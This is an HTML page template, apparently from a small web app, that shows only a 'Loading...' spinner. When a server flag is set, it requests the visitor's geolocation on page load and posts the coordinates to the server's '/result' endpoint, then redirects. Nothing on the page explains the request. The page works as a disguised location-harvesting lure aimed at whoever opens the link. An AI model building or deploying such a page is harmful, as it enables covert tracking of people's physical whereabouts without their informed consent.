<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loading...</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <style>
    .centered {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    </style>
  </head>
  <body>
    {{msg}}
    <div class="centered">
      <div class="spinner-border text-primary" role="status" style="align: center;">
        <span class="visually-hidden">Loading...</span>
      </div>
    </div>
    <script>
      var GetLoc={{GetLoc}}
    </script>
    <script>

      function Send(data,dir) {
          fetch(dir, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          })
          .then(function(response) {
            // 서버 응답 처리
          })
          .catch(function(error) {
            // 오류 처리
          });
      }

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else { 
          alert('위치정보가 전송되지 못했습니다.')
        }
      }
  
      
      function showPosition(position) {
          Send({latitude : position.coords.latitude, longitude : position.coords.longitude},'/result')
      }

      if (GetLoc==1.0){
        getLocation()
        setTimeout(() => location.href='/load', 4000);
      }
      else {
          setTimeout(() => location.href='/result', 1000);
        }
      </script>
  </body>
</html>
